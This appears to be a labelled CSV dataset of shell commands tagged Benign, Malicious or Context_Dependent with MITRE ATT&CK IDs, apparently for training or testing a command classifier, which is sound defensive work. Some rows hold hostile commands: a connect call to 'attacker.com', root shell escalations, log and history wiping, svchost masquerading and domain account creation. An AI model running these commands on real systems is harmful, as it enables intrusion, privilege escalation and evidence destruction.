command,label,original_label,mitre_id
macchina --ascii-artists,Benign,Benign,Benign
bitcoind -daemon,Benign,Benign,Benign
chkrootkit -n,Benign,Benign,Benign
avo checkout branch_name,Benign,Benign,Benign
.Md5.exe,Malicious,Malicious,T1497
su -c /bin/sh,Malicious,Malicious,T1059
nmap -A 192.168.1.1,Context_Dependent,Synthetic,Synthetic
gio trash trash://id,Benign,Benign,Benign
"ping --apple-time ""host""",Benign,Benign,Benign
pipx run --spec httpx-cli httpx http://www.github.com,Benign,Benign,Benign
cot --wait path/to/file,Benign,Benign,Benign
pacgraph [-b|--background] color,Benign,Benign,Benign
gopass sync,Benign,Benign,Benign
"expr substr ""string"" from length",Benign,Benign,Benign
"find ""${searchpath}"" -type f -print0 | xargs -0 grep -l -E ""${string1}.*${string2}.*${string3}""",Benign,Benign,Benign
chown amzadm.root -R /usr/lib/python2.6/site-packages/,Benign,Benign,Benign
mhwd-gpu --check,Benign,Benign,Benign
sqlite-utils create-database path/to/database.db,Benign,Benign,Benign
gotelemetry off,Benign,Benign,Benign
gau --from YYYYMM --to YYYYMM example.com,Benign,Benign,Benign
systemd-socket-activate path/to/socket.socket path/to/service.service,Benign,Benign,Benign
"eval ""$(poetry env activate)""",Benign,Benign,Benign
"find /home/pat -iname ""*.conf""",Context_Dependent,Benign,Benign
aws s3 sync s3://bucket_name/path/to/remote_location path/to/directory,Benign,Benign,Benign
paci refresh,Benign,Benign,Benign
shellcheck path/to/script.sh,Benign,Benign,Benign
rar a path/to/archive_name.rar path/to/directory,Benign,Benign,Benign
tree -d -L 1 -i --noreport,Benign,Benign,Benign
AdGuardHome --service stop|restart,Benign,Benign,Benign
markdown2pdf [-p|--path] path/to/input_file.md,Benign,Benign,Benign
find . -type d -exec chmod 500 {} \;,Benign,Benign,Benign
"net group ""$group"" ""$username"" /add /domain",Malicious,Malicious,T1136
abspath=$(readlink -e $path),Benign,Benign,Benign
mypy [-p|--package] package_name,Benign,Benign,Benign
pdftoppm -mono path/to/file.pdf image_name_prefix,Benign,Benign,Benign
"zipgrep [-H|--with-filename] [-n|--line-number] ""search_pattern"" path/to/file.zip",Benign,Benign,Benign
protector -dry-run branches_regex -repos organization/repository,Benign,Benign,Benign
timeout 20,Malicious,Malicious,T1497
doas -u root /bin/sh,Malicious,Malicious,T1059
pnmgamma -lineartobt709|srgbtobt709 path/to/image.pnm > path/to/output.pnm,Benign,Benign,Benign
find -mtime +7 -print > found.lst,Benign,Benign,Benign
pbmtolj [-r|-resolution] 75|100|150|300|600 path/to/input.pbm > path/to/output.lj,Benign,Benign,Benign
ss-local -s host -p server_port -l local port -k password -m encrypt_method,Context_Dependent,Benign,Benign
gh search code keyword1 keyword2 ...,Benign,Benign,Benign
"sudo gpasswd [-M|--members] user1,user2 group",Benign,Benign,Benign
aws ecr delete-repository --repository-name repository --force,Benign,Benign,Benign
drawing,Benign,Benign,Benign
datashader_cli points path/to/input_data.geo.parquet path/to/output_data.png --geo true --matplotlib true,Benign,Benign,Benign
kscreen-console [-h|--help],Benign,Benign,Benign
spotdl open.spotify.com/playlist/playlistId1 open.spotify.com/track/trackId2 ...,Benign,Benign,Benign
aws help topic_name,Benign,Benign,Benign
"archwiki-rs search ""search_text"" --text-search",Benign,Benign,Benign
"t:connect(""attacker.com"",12345);",Malicious,Malicious,T1059
tldr nmcli general,Benign,Benign,Benign
ibmcloud target -r region_name,Benign,Benign,Benign
timew start activity_tag,Benign,Benign,Benign
fprintd-enroll username,Benign,Benign,Benign
clang-tidy -checks=* -list-checks,Benign,Benign,Benign
pkg_delete -a package,Benign,Benign,Benign
tokei path/to/directory [-f|--files],Benign,Benign,Benign
sudo openrc runlevel_name,Benign,Benign,Benign
"echo ""command"" | at 1000",Benign,Benign,Benign
pg_verifybackup [-e|--exit-on-error] path/to/backup,Benign,Benign,Benign
prstat -s rss,Benign,Benign,Benign
"find /res/values-en-rUS /res/xml -iname '*.xml' | while read file; do grep -i ""hovering_msg"" ""$file""; done",Benign,Benign,Benign
find . -name core -exec rm {} \;,Benign,Benign,Benign
fastd [-c|--config] path/to/fastd.conf,Benign,Benign,Benign
"dirname ""$(readlink -f ""$0"")""",Benign,Benign,Benign
pip freeze --user,Benign,Benign,Benign
uv build,Benign,Benign,Benign
find . -name '.?*' -prune,Benign,Benign,Benign
shuf path/to/file,Benign,Benign,Benign
pg_walsummary [-q|--quiet] path/to/file,Benign,Benign,Benign
thunar --bulk-rename,Benign,Benign,Benign
find . -exec command {} \;,Benign,Benign,Benign
pnmtops [-w|-width] width [-h|-height] height path/to/file.pnm > path/to/file.ps,Benign,Benign,Benign
"find . -type d -name .git -exec sh -c ""cd \""{}\""/../ && pwd && git pull"" \;",Benign,Benign,Benign
"git ls-files | grep -P "".*(hpp|cpp)"" | xargs wc -l",Benign,Benign,Benign
"grep ""^core id"" /proc/cpuinfo | sort -u | wc -l",Benign,Benign,Benign
ember new my_new_app,Benign,Benign,Benign
"gallery-dl --cookies-from-browser browser ""url""",Benign,Benign,Benign
md5sum file*.txt,Benign,Benign,Benign
Remove-Item (Get-PSReadlineOption).HistorySavePath,Malicious,Malicious,T1070
"koji call build '""git+https://src.fedoraproject.org/rpms/vim.git#e847a50297a216229050bf4db3d06a139104e7cf""' \""target\"" --kwargs '{""opts"":{""scratch"": True}}'",Benign,Benign,Benign
0xFF 0xD8,Malicious,Malicious,T1036
elasticsearch-create-enrollment-token [-s|--scope] node --verbose,Benign,Benign,Benign
"wf-recorder [-g|--geometry] ""$(slurp -w 0)""",Benign,Benign,Benign
"kubectl set resources [deploy|deployment]/deployment_name --limits cpu=cpu_limit,memory=memory_limit",Benign,Benign,Benign
sudo find / -name mysql -print,Benign,Benign,Benign
NtWriteVirtualMemory,Malicious,Malicious,T1055
powerSQL -noninteractive -consoleoutput,Context_Dependent,Malicious,T1518
"screen -list | awk '{print $1}' | grep -q ""$1$""",Benign,Benign,Benign
wmic path win32_VideoController get name,Context_Dependent,Malicious,T1082
Connect-AzureAD -Credential $Credential 2>&1> $null,Malicious,Malicious,T1110
dmypy check -- path/to/file.py,Benign,Benign,Benign
bash-it search --enable|disable alias|plugin|completion,Benign,Benign,Benign
macptopbm path/to/file.macp > path/to/output.pbm,Benign,Benign,Benign
crane index append --flatten,Benign,Benign,Benign
pstree -s $$,Context_Dependent,Benign,Benign
wmic useraccount get /ALL,Context_Dependent,Malicious,T1033
chronyc ntpdata,Benign,Benign,Benign
"Invoke-Seatbelt -Command ""-group=all""",Context_Dependent,Malicious,T1082
"find . -name ""*.txt"" -printf ""%M %f \t %s bytes \t%y\n""",Benign,Benign,Benign
apptainer build --disable-cache path/to/image.sif docker://image:tag,Benign,Benign,Benign
evil-winrm [-i|--ip] ip_address [-u|--user] user [-p|--password] password,Benign,Benign,Benign
aplay [-c|--channels] 1 [-t|--file-type] raw [-r|--rate] 22050 [-f|--format] mu_law path/to/file,Benign,Benign,Benign
gst-device-monitor-1.0 [-f|--follow],Benign,Benign,Benign
reflac --preserve path/to/directory,Benign,Benign,Benign
clj -X namespace/function_name,Benign,Benign,Benign
jwt encode [-A|--alg] HS256 [-S|--secret] 1234567890 'json_string',Benign,Benign,Benign
"net group ""domain admins"" /domain",Context_Dependent,Malicious,T1069
find /home -type f -name test.txt -exec rm -f {} \,Context_Dependent,Benign,Benign
regsvr32.exe /u /s {PATH:.dll},Malicious,Malicious,T1218
perldoc -q regex,Benign,Benign,Benign
sudo pacman -Syu --overwrite path/to/file,Benign,Benign,Benign
sudo pacman -U --overwrite path/to/file path/to/package.pkg.tar.zst,Benign,Benign,Benign
cups-config --version,Benign,Benign,Benign
mosquitto [-c|--config-file] path/to/file.conf,Benign,Benign,Benign
gomi --prune orphans,Benign,Benign,Benign
systemd-cat --stderr-priority emerg|alert|crit|err|warning|notice|info|debug command,Benign,Benign,Benign
ddcutil [-d|--display] 1 [set|setvcp] 10 50,Benign,Benign,Benign
couchdb,Benign,Benign,Benign
pdfjoin path/to/file1.pdf path/to/file2.pdf ... 1 --outfile output_file,Benign,Benign,Benign
routel,Benign,Benign,Benign
emulator -avd name -sdcard path/to/sdcard.img,Benign,Benign,Benign
"xsv select column1,column2 path/to/file.csv",Benign,Benign,Benign
mpg321 [-Z|--random] path/to/file1|URL1 path/to/file2|URL2 ...,Benign,Benign,Benign
path=$(basename $path),Benign,Benign,Benign
sccmap -?,Benign,Benign,Benign
comm abc def,Benign,Benign,Benign
backlight_control,Benign,Benign,Benign
powerstat -a interval number_of_samples,Benign,Benign,Benign
figlet input_text,Benign,Benign,Benign
basename /EBF/DirectiveFiles/data_report_PD_import_script_ABF1_6,Benign,Benign,Benign
gh project [ls|list],Benign,Benign,Benign
doctum update,Benign,Benign,Benign
duckdb -f path/to/script.sql,Benign,Benign,Benign
git commit [-m|--message] message_text,Benign,Benign,Benign
"source <(date +""CDATE='%Y-%m-%d %H:%M:%S' EPOCH='%s'"")",Benign,Benign,Benign
kubens name,Benign,Benign,Benign
mv svnlog.py svnlog,Benign,Benign,Benign
"fs_cli [-x|--execute] ""command""",Benign,Benign,Benign
"find olddir -name script.sh -printf ""%p\0"" -printf ""newdir/%P\0"" | xargs -0L2 cp -n",Benign,Benign,Benign
"sudo find /var/log -name '$system_log_name1*' -exec rm {} \; #using ""rm"" execution",Malicious,Malicious,T1070
"system_profiler SPHardwareDataType|grep ""Serial Number (system)"" | awk '{ print $4 }'",Benign,Benign,Benign
neo4j-admin database load --from-path=path/to/directory database_name --overwrite-destination=true,Benign,Benign,Benign
nping --icmp --privileged example.com,Benign,Benign,Benign
decaffeinate --loose-js-modules path/to/file.coffee,Benign,Benign,Benign
tar tvf path/to/source.tar,Benign,Benign,Benign
"find / -type d -name ""project.images"" -ls",Context_Dependent,Benign,Benign
sudo date 093023592021.59,Benign,Benign,Benign
jhat [-p|-port] port dump_file.bin,Benign,Benign,Benign
nix develop nixpkgs#pkg,Benign,Benign,Benign
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce,Context_Dependent,Malicious,T1012
"tgpt [-c|--code] ""prompt""",Benign,Benign,Benign
ppmtoicr path/to/file.ppm > path/to/file.icr,Benign,Benign,Benign
wpscan --url url --enumerate u,Benign,Benign,Benign
xcaddy run --config path/to/file,Benign,Benign,Benign
makensis path/to/file.nsi,Benign,Benign,Benign
"echo 'echo ""Bash version: ${BASH_VERSION}""' | ssh -q localhost bash",Benign,Benign,Benign
gcov [-a|--all-blocks] path/to/file.cpp,Benign,Benign,Benign
dep deploy hostname,Benign,Benign,Benign
pcdovtoppm [-f|-font] font [-w|-white] path/to/file.pcd > path/to/output.ppm,Benign,Benign,Benign
nmap -sn 192.168.0.0/24,Context_Dependent,Synthetic,Synthetic
gulp,Benign,Benign,Benign
"Write-Output ""Download original function code failed.""",Malicious,Malicious,T1528
figlist,Benign,Benign,Benign
git clean [-f|--force] -- path/to/directory '*.ext',Benign,Benign,Benign
sort <(ls one) <(ls two) | uniq -d,Benign,Benign,Benign
git hash-object -w path/to/file,Benign,Benign,Benign
find ~/Library -name '* *' -print0 | xargs -0 tar rf blah.tar,Benign,Benign,Benign
toolbox rm [-f|--force] container_name,Benign,Benign,Benign
mbw -n 0 -t1 -q 2048,Benign,Benign,Benign
tlsx [-l|-list] path/to/hosts.txt [-ex|-expired] [-ss|-self-signed] [-mm|-mismatched] [-re|-revoked] [-un|-untrusted],Benign,Benign,Benign
sudo euse [-E|--enable] use_flag,Benign,Benign,Benign
numfmt --to si 1500,Benign,Benign,Benign
bats [-r|--recursive] path/to/directory,Benign,Benign,Benign
yaourt -S package,Benign,Benign,Benign
psql [-c|--command] 'query' database,Benign,Benign,Benign
find . -perm -600 -print,Benign,Benign,Benign
ssh -R 8080:localhost:80 user@10.10.10.10,Context_Dependent,Synthetic,Synthetic
"ts-node [-e|--eval] 'console.log(""Hello World"")'",Benign,Benign,Benign
chown `stat -c %U originalfile`:`stat -c %G originalfile` newfile,Benign,Benign,Benign
VBoxManage startvm vm_name|uuid --password path/to/password_file,Benign,Benign,Benign
echo $ENCODED | b64decode -r,Malicious,Malicious,T1140
ppmchange [-r|-remainder] color oldcolor1 newcolor1 oldcolor2 newcolor2 ... path/to/input.ppm > path/to/output.ppm,Benign,Benign,Benign
find /etc -size +100k -size -150k,Benign,Benign,Benign
xbacklight -inc 25,Benign,Benign,Benign
sudo eclean packages,Benign,Benign,Benign
dpkg-reconfigure console-setup,Benign,Benign,Benign
steam steam://open/console,Benign,Benign,Benign
ansible-lint path/to/playbook_file path/to/role_directory,Benign,Benign,Benign
systemd-cgtop,Benign,Benign,Benign
ytfzf [-t|--show-thumbnails] search_pattern,Benign,Benign,Benign
trawl -l,Benign,Benign,Benign
pipwin search partial_name|name,Benign,Benign,Benign
choco search query --local-only,Benign,Benign,Benign
find -print0 | xargs --null,Benign,Benign,Benign
glab pipeline run --branch branch_name,Benign,Benign,Benign
pw-dot [-r|--remote] remote_name [-s|--smart],Benign,Benign,Benign
"find /some/parrent/dir -type d | while read d ; do ls ""$d""/* &>/dev/null || rm -r ""$d""; done",Benign,Benign,Benign
"""PathToAtomicsFolder\..\ExternalPayloads\build\namedpipes_executor.exe"" --pipe 5",Malicious,Malicious,T1559
pueue enqueue task_id,Benign,Benign,Benign
GetIpAddrTable,Context_Dependent,Malicious,T1016
"find /tmp -type f -name "".*""",Benign,Benign,Benign
find /home -name 'authorized_keys' 2>/dev/null,Context_Dependent,Synthetic,Synthetic
mcookie [-v|--verbose],Benign,Benign,Benign
rig -c number,Benign,Benign,Benign
dscacheutil -q group,Context_Dependent,Malicious,T1087
pkgutil --files com.microsoft.Word,Benign,Benign,Benign
find myfile -perm 0644 -print,Benign,Benign,Benign
sudo lvdisplay,Benign,Benign,Benign
<Alt a>,Benign,Benign,Benign
kubectl plugin list --name-only,Benign,Benign,Benign
"find /mnt/zip -name ""*prefs copy"" -print0 | xargs -p rm",Benign,Benign,Benign
cockpit-ws --address ip_address,Benign,Benign,Benign
dunst [-conf|-config] path/to/file,Benign,Benign,Benign
look prefix,Benign,Benign,Benign
find . -type f \( -name '*.c' -or -name '*.h' -or -name '*.cpp' \) -exec ls {} \;,Benign,Benign,Benign
gt co branch_name,Benign,Benign,Benign
sudo rusnapshot [-c|--config] path/to/config.toml --cr,Benign,Benign,Benign
chgrp -R my_group files,Benign,Benign,Benign
set -o pipefail,Benign,Benign,Benign
"find /path -type d -exec chmod 0755 ""{}"" \;",Benign,Benign,Benign
makepasswd,Benign,Benign,Benign
in-toto-run [-n|--step-name] tag [-p|--products] . --signing-key key_file -- git tag v1.0,Benign,Benign,Benign
logcat --pid pid,Benign,Benign,Benign
pbmnoise width height -randomseed value > path/to/output.pbm,Benign,Benign,Benign
ghc path/to/file.hs,Benign,Benign,Benign
brightness -l,Benign,Benign,Benign
bcomps -x -o path/to/output.gv path/to/input1.gv path/to/input2.gv ...,Benign,Benign,Benign
exiv2 path/to/file,Benign,Benign,Benign
pulumi destroy [-s|--stack] stack,Benign,Benign,Benign
SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows,Malicious,Malicious,T1546
swift package generate-xcodeproj,Benign,Benign,Benign
pnmscalefixed [-w|-width] width [-h|-height] height path/to/input.pnm > path/to/output.pnm,Benign,Benign,Benign
mediainfo --Info-Parameters,Benign,Benign,Benign
bpkg update,Benign,Benign,Benign
neofetch --enable|disable infoname,Benign,Benign,Benign
rabbitmq-plugins set plugin,Benign,Benign,Benign
find /path/to/junk/files -type f -mtime +31 -print0 | xargs -0 -r rm -f,Benign,Benign,Benign
kpartx -av whole_disk.img,Benign,Benign,Benign
sudo cu [-l|--line] /dev/ttyXYZ [-s|--speed] 115200 --parity=even|odd|none [-f|--nortscts] --nostop,Benign,Benign,Benign
udiskie-mount --verbose /dev/sdX1,Benign,Benign,Benign
"getopt [-o|--options] vV [-l|--longoptions] verbose,version -- --version --verbose",Benign,Benign,Benign
hledger [is|incomestatement] [-MTAS|--monthly --row-total --average --sort-amount] [-2|--depth 2],Benign,Benign,Benign
tldr chromium,Benign,Benign,Benign
pdffonts -loc path/to/file.pdf,Benign,Benign,Benign
gh gpg-key delete key_id,Benign,Benign,Benign
mosquitto_passwd -c path/to/password_file username,Benign,Benign,Benign
ps -A|grep mysql,Context_Dependent,Benign,Benign
fortune,Benign,Benign,Benign
copy %SystemRoot%\System32\wscript.exe %APPDATA%\svchost.exe /Y,Malicious,Malicious,T1036
whereis xxd,Context_Dependent,Synthetic,Synthetic
df --total -BT | tail -n 1 | sed -E 's/total *([^ ]*).*/\1/',Benign,Benign,Benign
mips_ff,Malicious,Malicious,T1562
find . -type d -exec chmod 2775 {} \;,Context_Dependent,Benign,Benign
tmsu tags *.mp3,Benign,Benign,Benign
find /home/*/public_html/ -type f \( -iwholename '*/libraries/joomla/version.php' -o -iwholename '*/libraries/cms/version.php' -o -iwholename '*/libraries/cms/version/version.php' \) -print0 -exec perl -e 'while (<>) { $release = $1 if m/ \$RELEASE\s+= .([\d.]+).;/; $dev = $1 if m/ \$DEV_LEVEL\s+= .(\d+).;/; } print qq( = $release.$dev\n);' {} \;,Context_Dependent,Benign,Benign
cidr divide 10.0.0.0/16 9,Benign,Benign,Benign
rabbitmq-upgrade await_online_quorum_plus_one,Benign,Benign,Benign
rpcinfo -s localhost,Benign,Benign,Benign
latex -halt-on-error source.tex,Benign,Benign,Benign
"join -t, -o 1.2,2.2,2.3 -a 1 -a 2 -e 'no-match' - <(sort file1.txt)",Benign,Benign,Benign
IActiveScriptParseProcedure32,Context_Dependent,Malicious,T1012
sysdig [-c|--chisel] spy_ip ip_address,Benign,Benign,Benign
caffeinate -d,Benign,Benign,Benign
trivy repo path/to/local_repository_directory|remote_repository_URL,Benign,Benign,Benign
sudo tlmgr update --all --dry-run,Benign,Benign,Benign
deno,Benign,Benign,Benign
"daemon [-n|--name] ""name"" [-l|--errlog] path/to/file.log command",Benign,Benign,Benign
goku --help,Benign,Benign,Benign
copilot --resume,Benign,Benign,Benign
gource --title title,Benign,Benign,Benign
"zint --barcode code_type --data ""UTF-8 data"" --output path/to/file",Benign,Benign,Benign
